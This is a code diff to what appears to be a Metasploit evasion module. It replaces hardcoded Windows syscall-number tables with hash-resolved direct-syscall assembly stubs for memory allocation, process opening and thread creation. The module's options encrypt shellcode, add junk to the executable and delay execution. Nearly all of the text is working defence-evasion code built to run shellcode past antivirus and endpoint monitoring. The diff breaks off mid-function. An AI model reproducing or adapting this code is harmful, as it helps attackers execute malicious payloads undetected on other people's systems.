@@ -28,7 +28,7 @@ class MetasploitModule < Msf::Evasion
     register_options(
       [
         OptEnum.new('CIPHER', [ true, 'Shellcode encryption type', 'xor', ['xor', 'rc4']]),
-        OptInt.new('SLEEP', [false, 'Sleep time before executing shellcode', 7000]),
+        OptInt.new('SLEEP', [false, 'Sleep time before executing shellcode', 10000]),
         OptBool.new('JUNK', [false, 'Add random info to the final executable', true])
       ]
     )
@@ -40,617 +40,126 @@ class MetasploitModule < Msf::Evasion
     )
   end
 
+  def calc_hash(name)
+    hash = @hash
+    ror8 = ->(v) { ((v >> 8) & 0xffffffff) | ((v << 24) & 0xffffffff) }
+    name.sub!('Nt', 'Zw')
+    name << "\x00"
+    for x in (0..name.length - 2).map { |i| name[i..i + 1] if name[i..i + 1].length == 2 }
+      p_name = x.unpack('S')[0]
+      hash ^= p_name + ror8.call(hash)
+    end
+    hash.to_s(16)
+  end
+
   def nt_alloc
     %^
-        __asm__("NtAllocateVirtualMemory: \\n\\
-            mov rax, gs:[0x60]                                  \\n\\
-        NtAllocateVirtualMemory_Check_X_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x118], 6 \\n\\
-            je  NtAllocateVirtualMemory_Check_6_X_XXXX \\n\\
-            cmp dword ptr [rax+0x118], 10 \\n\\
-            je  NtAllocateVirtualMemory_Check_10_0_XXXX \\n\\
-            jmp NtAllocateVirtualMemory_SystemCall_Unknown \\n\\
-        NtAllocateVirtualMemory_Check_6_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x11c], 1 \\n\\
-            je  NtAllocateVirtualMemory_Check_6_1_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 2 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_6_2_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 3 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_6_3_XXXX \\n\\
-            jmp NtAllocateVirtualMemory_SystemCall_Unknown \\n\\
-        NtAllocateVirtualMemory_Check_6_1_XXXX:                \\n\\
-            cmp word ptr [rax+0x120], 7600 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_6_1_7600 \\n\\
-            cmp word ptr [rax+0x120], 7601 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_6_1_7601 \\n\\
-            jmp NtAllocateVirtualMemory_SystemCall_Unknown \\n\\
-        NtAllocateVirtualMemory_Check_10_0_XXXX:               \\n\\
-            cmp word ptr [rax+0x120], 10240 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_10240 \\n\\
-            cmp word ptr [rax+0x120], 10586 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_10586 \\n\\
-            cmp word ptr [rax+0x120], 14393 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_14393 \\n\\
-            cmp word ptr [rax+0x120], 15063 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_15063 \\n\\
-            cmp word ptr [rax+0x120], 16299 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_16299 \\n\\
-            cmp word ptr [rax+0x120], 17134 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_17134 \\n\\
-            cmp word ptr [rax+0x120], 17763 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_17763 \\n\\
-            cmp word ptr [rax+0x120], 18362 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_18362 \\n\\
-            cmp word ptr [rax+0x120], 18363 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_18363 \\n\\
-            cmp word ptr [rax+0x120], 19041 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_19041 \\n\\
-            cmp word ptr [rax+0x120], 19042 \\n\\
-            je  NtAllocateVirtualMemory_SystemCall_10_0_19042 \\n\\
-            jmp NtAllocateVirtualMemory_SystemCall_Unknown \\n\\
-        NtAllocateVirtualMemory_SystemCall_6_1_7600:           \\n\\
-            mov eax, 0x0015 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_6_1_7601:           \\n\\
-            mov eax, 0x0015 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_6_2_XXXX:           \\n\\
-            mov eax, 0x0016 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_6_3_XXXX:           \\n\\
-            mov eax, 0x0017 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_10240:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_10586:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_14393:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_15063:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_16299:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_17134:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_17763:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_18362:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_18363:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_19041:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_10_0_19042:         \\n\\
-            mov eax, 0x0018 \\n\\
-            jmp NtAllocateVirtualMemory_Epilogue \\n\\
-        NtAllocateVirtualMemory_SystemCall_Unknown:            \\n\\
-            ret \\n\\
-        NtAllocateVirtualMemory_Epilogue: \\n\\
-            mov r10, rcx \\n\\
-            syscall \\n\\
-            ret \\n\\
-    ^.strip
+    __asm__("NtAllocateVirtualMemory: \\n\\
+        mov [rsp +8], rcx          \\n\\
+        mov [rsp+16], rdx\\n\\
+        mov [rsp+24], r8\\n\\
+        mov [rsp+32], r9\\n\\
+        sub rsp, 0x28\\n\\
+        mov ecx, 0x#{calc_hash 'NtAllocateVirtualMemory'}        \\n\\
+        call GetSyscallNumber  \\n\\
+        add rsp, 0x28 \\n\\
+        mov rcx, [rsp +8]          \\n\\
+        mov rdx, [rsp+16] \\n\\
+        mov r8, [rsp+24] \\n\\
+        mov r9, [rsp+32] \\n\\
+        mov r10, rcx \\n\\
+        syscall                    \\n\\
+        ret \\n\\
+    ");
+    ^
   end
 
   def nt_close
-    %(
-        NtClose: \\n\\
-            mov rax, gs:[0x60]                  \\n\\
-        NtClose_Check_X_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x118], 6 \\n\\
-            je  NtClose_Check_6_X_XXXX \\n\\
-            cmp dword ptr [rax+0x118], 10 \\n\\
-            je  NtClose_Check_10_0_XXXX \\n\\
-            jmp NtClose_SystemCall_Unknown \\n\\
-        NtClose_Check_6_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x11c], 1 \\n\\
-            je  NtClose_Check_6_1_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 2 \\n\\
-            je  NtClose_SystemCall_6_2_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 3 \\n\\
-            je  NtClose_SystemCall_6_3_XXXX \\n\\
-            jmp NtClose_SystemCall_Unknown \\n\\
-        NtClose_Check_6_1_XXXX:                \\n\\
-            cmp word ptr [rax+0x120], 7600 \\n\\
-            je  NtClose_SystemCall_6_1_7600 \\n\\
-            cmp word ptr [rax+0x120], 7601 \\n\\
-            je  NtClose_SystemCall_6_1_7601 \\n\\
-            jmp NtClose_SystemCall_Unknown \\n\\
-        NtClose_Check_10_0_XXXX:               \\n\\
-            cmp word ptr [rax+0x120], 10240 \\n\\
-            je  NtClose_SystemCall_10_0_10240 \\n\\
-            cmp word ptr [rax+0x120], 10586 \\n\\
-            je  NtClose_SystemCall_10_0_10586 \\n\\
-            cmp word ptr [rax+0x120], 14393 \\n\\
-            je  NtClose_SystemCall_10_0_14393 \\n\\
-            cmp word ptr [rax+0x120], 15063 \\n\\
-            je  NtClose_SystemCall_10_0_15063 \\n\\
-            cmp word ptr [rax+0x120], 16299 \\n\\
-            je  NtClose_SystemCall_10_0_16299 \\n\\
-            cmp word ptr [rax+0x120], 17134 \\n\\
-            je  NtClose_SystemCall_10_0_17134 \\n\\
-            cmp word ptr [rax+0x120], 17763 \\n\\
-            je  NtClose_SystemCall_10_0_17763 \\n\\
-            cmp word ptr [rax+0x120], 18362 \\n\\
-            je  NtClose_SystemCall_10_0_18362 \\n\\
-            cmp word ptr [rax+0x120], 18363 \\n\\
-            je  NtClose_SystemCall_10_0_18363 \\n\\
-            cmp word ptr [rax+0x120], 19041 \\n\\
-            je  NtClose_SystemCall_10_0_19041 \\n\\
-            cmp word ptr [rax+0x120], 19042 \\n\\
-            je  NtClose_SystemCall_10_0_19042 \\n\\
-            jmp NtClose_SystemCall_Unknown \\n\\
-        NtClose_SystemCall_6_1_7600:           \\n\\
-            mov eax, 0x000c \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_6_1_7601:           \\n\\
-            mov eax, 0x000c \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_6_2_XXXX:           \\n\\
-            mov eax, 0x000d \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_6_3_XXXX:           \\n\\
-            mov eax, 0x000e \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_10240:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_10586:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_14393:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_15063:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_16299:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_17134:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_17763:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_18362:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_18363:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_19041:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_10_0_19042:         \\n\\
-            mov eax, 0x000f \\n\\
-            jmp NtClose_Epilogue \\n\\
-        NtClose_SystemCall_Unknown:            \\n\\
-            ret \\n\\
-        NtClose_Epilogue: \\n\\
-            mov r10, rcx \\n\\
-            syscall \\n\\
-            ret \\n\\
-    ).strip
+    %^
+    __asm__("NtClose: \\n\\
+        mov [rsp +8], rcx       \\n\\
+        mov [rsp+16], rdx \\n\\
+        mov [rsp+24], r8 \\n\\
+        mov [rsp+32], r9 \\n\\
+        sub rsp, 0x28 \\n\\
+        mov ecx, 0x#{calc_hash 'NtClose'}      \\n\\
+        call GetSyscallNumber  \\n\\
+        add rsp, 0x28 \\n\\
+        mov rcx, [rsp +8]          \\n\\
+        mov rdx, [rsp+16] \\n\\
+        mov r8, [rsp+24] \\n\\
+        mov r9, [rsp+32] \\n\\
+        mov r10, rcx \\n\\
+        syscall                    \\n\\
+        ret \\n\\
+    ");
+    ^
   end
 
   def nt_create_thread
-    %(
-        NtCreateThreadEx: \\n\\
-            mov rax, gs:[0x60]                           \\n\\
-        NtCreateThreadEx_Check_X_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x118], 6 \\n\\
-            je  NtCreateThreadEx_Check_6_X_XXXX \\n\\
-            cmp dword ptr [rax+0x118], 10 \\n\\
-            je  NtCreateThreadEx_Check_10_0_XXXX \\n\\
-            jmp NtCreateThreadEx_SystemCall_Unknown \\n\\
-        NtCreateThreadEx_Check_6_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x11c], 1 \\n\\
-            je  NtCreateThreadEx_Check_6_1_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 2 \\n\\
-            je  NtCreateThreadEx_SystemCall_6_2_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 3 \\n\\
-            je  NtCreateThreadEx_SystemCall_6_3_XXXX \\n\\
-            jmp NtCreateThreadEx_SystemCall_Unknown \\n\\
-        NtCreateThreadEx_Check_6_1_XXXX:                \\n\\
-            cmp word ptr [rax+0x120], 7600 \\n\\
-            je  NtCreateThreadEx_SystemCall_6_1_7600 \\n\\
-            cmp word ptr [rax+0x120], 7601 \\n\\
-            je  NtCreateThreadEx_SystemCall_6_1_7601 \\n\\
-            jmp NtCreateThreadEx_SystemCall_Unknown \\n\\
-        NtCreateThreadEx_Check_10_0_XXXX:               \\n\\
-            cmp word ptr [rax+0x120], 10240 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_10240 \\n\\
-            cmp word ptr [rax+0x120], 10586 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_10586 \\n\\
-            cmp word ptr [rax+0x120], 14393 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_14393 \\n\\
-            cmp word ptr [rax+0x120], 15063 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_15063 \\n\\
-            cmp word ptr [rax+0x120], 16299 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_16299 \\n\\
-            cmp word ptr [rax+0x120], 17134 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_17134 \\n\\
-            cmp word ptr [rax+0x120], 17763 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_17763 \\n\\
-            cmp word ptr [rax+0x120], 18362 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_18362 \\n\\
-            cmp word ptr [rax+0x120], 18363 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_18363 \\n\\
-            cmp word ptr [rax+0x120], 19041 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_19041 \\n\\
-            cmp word ptr [rax+0x120], 19042 \\n\\
-            je  NtCreateThreadEx_SystemCall_10_0_19042 \\n\\
-            jmp NtCreateThreadEx_SystemCall_Unknown \\n\\
-        NtCreateThreadEx_SystemCall_6_1_7600:           \\n\\
-            mov eax, 0x00a5 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_6_1_7601:           \\n\\
-            mov eax, 0x00a5 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_6_2_XXXX:           \\n\\
-            mov eax, 0x00af \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_6_3_XXXX:           \\n\\
-            mov eax, 0x00b0 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_10240:         \\n\\
-            mov eax, 0x00b3 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_10586:         \\n\\
-            mov eax, 0x00b4 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_14393:         \\n\\
-            mov eax, 0x00b6 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_15063:         \\n\\
-            mov eax, 0x00b9 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_16299:         \\n\\
-            mov eax, 0x00ba \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_17134:         \\n\\
-            mov eax, 0x00bb \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_17763:         \\n\\
-            mov eax, 0x00bc \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_18362:         \\n\\
-            mov eax, 0x00bd \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_18363:         \\n\\
-            mov eax, 0x00bd \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_19041:         \\n\\
-            mov eax, 0x00c1 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_10_0_19042:         \\n\\
-            mov eax, 0x00c1 \\n\\
-            jmp NtCreateThreadEx_Epilogue \\n\\
-        NtCreateThreadEx_SystemCall_Unknown:            \\n\\
-            ret \\n\\
-        NtCreateThreadEx_Epilogue: \\n\\
-            mov r10, rcx \\n\\
-            syscall \\n\\
-            ret \\n\\
-    ).strip
+    %^
+    __asm__("NtCreateThreadEx: \\n\\
+        mov [rsp +8], rcx          \\n\\
+        mov [rsp+16], rdx\\n\\
+        mov [rsp+24], r8\\n\\
+        mov [rsp+32], r9\\n\\
+        sub rsp, 0x28\\n\\
+        mov ecx, 0x#{calc_hash 'NtCreateThreadEx'}        \\n\\
+        call GetSyscallNumber  \\n\\
+        add rsp, 0x28\\n\\
+        mov rcx, [rsp +8]          \\n\\
+        mov rdx, [rsp+16]\\n\\
+        mov r8, [rsp+24]\\n\\
+        mov r9, [rsp+32]\\n\\
+        mov r10, rcx\\n\\
+        syscall                    \\n\\
+        ret \\n\\
+    ");
+    ^
   end
 
   def nt_open_process
-    %(
-        NtOpenProcess: \\n\\
-            mov rax, gs:[0x60]                        \\n\\
-        NtOpenProcess_Check_X_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x118], 6 \\n\\
-            je  NtOpenProcess_Check_6_X_XXXX \\n\\
-            cmp dword ptr [rax+0x118], 10 \\n\\
-            je  NtOpenProcess_Check_10_0_XXXX \\n\\
-            jmp NtOpenProcess_SystemCall_Unknown \\n\\
-        NtOpenProcess_Check_6_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x11c], 1 \\n\\
-            je  NtOpenProcess_Check_6_1_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 2 \\n\\
-            je  NtOpenProcess_SystemCall_6_2_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 3 \\n\\
-            je  NtOpenProcess_SystemCall_6_3_XXXX \\n\\
-            jmp NtOpenProcess_SystemCall_Unknown \\n\\
-        NtOpenProcess_Check_6_1_XXXX:                \\n\\
-            cmp word ptr [rax+0x120], 7600 \\n\\
-            je  NtOpenProcess_SystemCall_6_1_7600 \\n\\
-            cmp word ptr [rax+0x120], 7601 \\n\\
-            je  NtOpenProcess_SystemCall_6_1_7601 \\n\\
-            jmp NtOpenProcess_SystemCall_Unknown \\n\\
-        NtOpenProcess_Check_10_0_XXXX:               \\n\\
-            cmp word ptr [rax+0x120], 10240 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_10240 \\n\\
-            cmp word ptr [rax+0x120], 10586 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_10586 \\n\\
-            cmp word ptr [rax+0x120], 14393 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_14393 \\n\\
-            cmp word ptr [rax+0x120], 15063 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_15063 \\n\\
-            cmp word ptr [rax+0x120], 16299 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_16299 \\n\\
-            cmp word ptr [rax+0x120], 17134 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_17134 \\n\\
-            cmp word ptr [rax+0x120], 17763 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_17763 \\n\\
-            cmp word ptr [rax+0x120], 18362 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_18362 \\n\\
-            cmp word ptr [rax+0x120], 18363 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_18363 \\n\\
-            cmp word ptr [rax+0x120], 19041 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_19041 \\n\\
-            cmp word ptr [rax+0x120], 19042 \\n\\
-            je  NtOpenProcess_SystemCall_10_0_19042 \\n\\
-            jmp NtOpenProcess_SystemCall_Unknown \\n\\
-        NtOpenProcess_SystemCall_6_1_7600:           \\n\\
-            mov eax, 0x0023 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_6_1_7601:           \\n\\
-            mov eax, 0x0023 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_6_2_XXXX:           \\n\\
-            mov eax, 0x0024 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_6_3_XXXX:           \\n\\
-            mov eax, 0x0025 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_10240:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_10586:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_14393:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_15063:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_16299:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_17134:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_17763:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_18362:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_18363:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_19041:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_10_0_19042:         \\n\\
-            mov eax, 0x0026 \\n\\
-            jmp NtOpenProcess_Epilogue \\n\\
-        NtOpenProcess_SystemCall_Unknown:            \\n\\
-            ret \\n\\
-        NtOpenProcess_Epilogue: \\n\\
-            mov r10, rcx \\n\\
-            syscall \\n\\
-            ret \\n\\
-    ).strip
-  end
-
-  def nt_wait
-    %(
-        NtWaitForSingleObject: \\n\\
-            mov rax, gs:[0x60]                                \\n\\
-        NtWaitForSingleObject_Check_X_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x118], 6 \\n\\
-            je  NtWaitForSingleObject_Check_6_X_XXXX \\n\\
-            cmp dword ptr [rax+0x118], 10 \\n\\
-            je  NtWaitForSingleObject_Check_10_0_XXXX \\n\\
-            jmp NtWaitForSingleObject_SystemCall_Unknown \\n\\
-        NtWaitForSingleObject_Check_6_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x11c], 1 \\n\\
-            je  NtWaitForSingleObject_Check_6_1_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 2 \\n\\
-            je  NtWaitForSingleObject_SystemCall_6_2_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 3 \\n\\
-            je  NtWaitForSingleObject_SystemCall_6_3_XXXX \\n\\
-            jmp NtWaitForSingleObject_SystemCall_Unknown \\n\\
-        NtWaitForSingleObject_Check_6_1_XXXX:                \\n\\
-            cmp word ptr [rax+0x120], 7600 \\n\\
-            je  NtWaitForSingleObject_SystemCall_6_1_7600 \\n\\
-            cmp word ptr [rax+0x120], 7601 \\n\\
-            je  NtWaitForSingleObject_SystemCall_6_1_7601 \\n\\
-            jmp NtWaitForSingleObject_SystemCall_Unknown \\n\\
-        NtWaitForSingleObject_Check_10_0_XXXX:               \\n\\
-            cmp word ptr [rax+0x120], 10240 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_10240 \\n\\
-            cmp word ptr [rax+0x120], 10586 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_10586 \\n\\
-            cmp word ptr [rax+0x120], 14393 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_14393 \\n\\
-            cmp word ptr [rax+0x120], 15063 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_15063 \\n\\
-            cmp word ptr [rax+0x120], 16299 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_16299 \\n\\
-            cmp word ptr [rax+0x120], 17134 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_17134 \\n\\
-            cmp word ptr [rax+0x120], 17763 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_17763 \\n\\
-            cmp word ptr [rax+0x120], 18362 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_18362 \\n\\
-            cmp word ptr [rax+0x120], 18363 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_18363 \\n\\
-            cmp word ptr [rax+0x120], 19041 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_19041 \\n\\
-            cmp word ptr [rax+0x120], 19042 \\n\\
-            je  NtWaitForSingleObject_SystemCall_10_0_19042 \\n\\
-            jmp NtWaitForSingleObject_SystemCall_Unknown \\n\\
-        NtWaitForSingleObject_SystemCall_6_1_7600:           \\n\\
-            mov eax, 0x0001 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_6_1_7601:           \\n\\
-            mov eax, 0x0001 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_6_2_XXXX:           \\n\\
-            mov eax, 0x0002 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_6_3_XXXX:           \\n\\
-            mov eax, 0x0003 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_10240:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_10586:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_14393:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_15063:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_16299:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_17134:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_17763:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_18362:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_18363:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_19041:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_10_0_19042:         \\n\\
-            mov eax, 0x0004 \\n\\
-            jmp NtWaitForSingleObject_Epilogue \\n\\
-        NtWaitForSingleObject_SystemCall_Unknown:            \\n\\
-            ret \\n\\
-        NtWaitForSingleObject_Epilogue: \\n\\
-            mov r10, rcx \\n\\
-            syscall \\n\\
-            ret \\n\\
-    ).strip
+    %^
+    __asm__("NtOpenProcess: \\n\\
+        mov [rsp +8], rcx           \\n\\
+        mov [rsp+16], rdx \\n\\
+        mov [rsp+24], r8 \\n\\
+        mov [rsp+32], r9 \\n\\
+        sub rsp, 0x28 \\n\\
+        mov ecx, 0x#{calc_hash 'NtOpenProcess'}        \\n\\
+        call GetSyscallNumber  \\n\\
+        add rsp, 0x28 \\n\\
+        mov rcx, [rsp +8]         \\n\\
